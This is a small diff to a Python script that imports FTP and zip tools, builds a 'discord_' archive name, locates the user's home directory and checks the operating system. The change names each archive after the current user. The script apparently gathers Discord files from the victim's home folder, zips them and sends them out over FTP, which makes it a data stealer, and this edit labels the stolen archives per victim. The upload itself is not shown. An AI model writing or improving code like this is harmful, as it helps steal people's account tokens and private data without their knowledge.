@@ -2,6 +2,7 @@ from random import random
 from datetime import datetime
 from ftplib import FTP
 from zipfile import ZipFile
+from getpass import getuser
 import os.path
 import platform
 
@@ -23,8 +24,9 @@ try:
 
     os_type = platform.system()
     time = datetime.now()
+    username = getuser()
     salt = round(random() * 100000)
-    zip_name = 'discord_' + str(time.strftime("%d-%m-%y_%I-%M_")) + str(salt) + '.zip'
+    zip_name = username + '_' + str(time.strftime("%d-%m-%y_%I-%M_")) + str(salt) + '.zip'
     usr_home = os.path.expanduser('~')
 
     if os_type == "Windows":
